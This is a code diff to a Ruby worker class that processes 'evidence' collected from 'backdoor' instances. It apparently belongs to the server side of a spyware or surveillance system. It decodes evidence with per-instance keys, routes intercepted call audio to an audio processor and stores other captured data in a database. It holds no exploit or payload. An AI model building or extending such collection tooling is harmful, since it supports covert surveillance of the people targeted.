@@ -5,6 +5,8 @@ require 'rcs-common/trace'
 require 'rcs-common/evidence'
 require 'rcs-common/evidence_manager'
 
+require 'rcs-db/db_layer'
+
 module RCS
 module Worker
 
@@ -19,19 +21,23 @@ class InstanceProcessor
     @state = :stopped
     @seconds_sleeping = 0
     
-    info = RCS::EvidenceManager.instance_info @id
-    trace :info, "Created processor for backdoor #{info['build']}:#{info['instance']}"
+    # get info about the backdoor instance from evidence db
+    @info = RCS::EvidenceManager.instance_info @id
+    raise "Instance \'#{@id}\' cannot be found." if @info.nil?
+    
+    trace :info, "Created processor for backdoor #{@info['build']}:#{@info['instance']}"
     
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
-    trace :debug, "Evidence key #{info['key']}"
-    @key = Digest::MD5.digest info['key']
-
+    trace :debug, "Evidence key #{@info['key']}"
+    @key = Digest::MD5.digest @info['key']
+    
     @audio_processor = AudioProcessor.new
   end
   
   def resume
     @state = :running
+    RCS::EvidenceManager.sync_status({:instance => @info['instance']}, RCS::EvidenceManager::SYNC_PROCESSING)
     @seconds_sleeping = 0
   end
   
@@ -43,6 +49,7 @@ class InstanceProcessor
   
   def put_to_sleep
     @state = :stopped
+    RCS::EvidenceManager.sync_status({:instance => @info['instance']}, RCS::EvidenceManager::SYNC_IDLE)
     trace :debug, "[#{Thread.current}][#{@id}] sleeping too much, let's stop!"
   end
   
@@ -56,15 +63,16 @@ class InstanceProcessor
   
   def queue(evidence)
     @evidences << evidence unless evidence.nil?
-    #trace :info, "queueing #{evidence} for #{@id}"
+    trace :info, "queueing #{evidence} for #{@id}"
     
     process = Proc.new do
       resume
+
       until sleeping_too_much?
         until @evidences.empty?
           resume
           evidence_id = @evidences.shift
-
+          
           begin
             # get evidence and deserialize it
             data = RCS::EvidenceManager.get_evidence(evidence_id, @id)
@@ -76,17 +84,17 @@ class InstanceProcessor
             
             evidence.process if evidence.respond_to? :process
             
-            case evidence.type
-            when :CALL
-              trace :debug, "Evidence channel #{evidence.channel} callee #{evidence.callee} with #{evidence.wav.size} bytes of data."
-              @audio_processor.feed(evidence)
-              #@audio_processor.to_wavfile
+            case evidence.info[:type]
+              when :CALL
+                @audio_processor.feed(evidence)
+              else
+                RCS::DB::DB.evidence_store(evidence)
             end
             
             trace :debug, "[#{Thread.current}][#{@id}] processed #{evidence_id} of type #{evidence.type}, #{data.size} bytes."
             
           rescue EvidenceDeserializeError => e
-            trace :info, "DECODING FAILED: " << e.to_s
+            trace :info, "[#{Thread.current}][#{@id}] decoding failed for #{evidence_id}: " << e.to_s
             # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
           rescue Exception => e
             trace :fatal, "FAILURE: " << e.to_s
